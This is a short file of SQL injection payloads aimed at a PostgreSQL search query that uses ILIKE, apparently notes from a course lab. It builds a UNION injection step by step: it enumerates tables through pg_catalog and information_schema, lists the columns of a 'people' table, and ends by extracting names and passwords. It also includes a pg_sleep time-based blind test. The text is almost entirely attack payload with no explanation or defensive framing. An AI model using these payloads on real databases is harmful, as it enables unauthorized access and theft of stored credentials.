SELECT ? FROM ? WHERE ? ILIKE '%?%';

SELECT schemaname, tablename, tableowner FROM pg_catalog.pg_tables; 

SELECT ? FROM ? WHERE ? ILIKE '%.' UNION SELECT schemaname, tablename, tableowner FROM pg_catalog.pg_tables; --%';

-- .' UNION SELECT table_name, table_schema, '3' FROM information_schema.tables ; --
-- .' UNION SELECT table_name, table_schema, '3' FROM information_schema.tables where table_schema = 'public'; --

SELECT ? FROM ? WHERE ? ILIKE '%COMP1%' and pg_sleep(1) is not null; --

SELECT ? FROM ? WHERE ? ILIKE '%.' UNION SELECT column_name, '2', '3' FROM information_schema.columns where table_name='people';--

SELECT ? FROM ? WHERE ? ILIKE '%.' UNION SELECT zid, name, password FROM people;--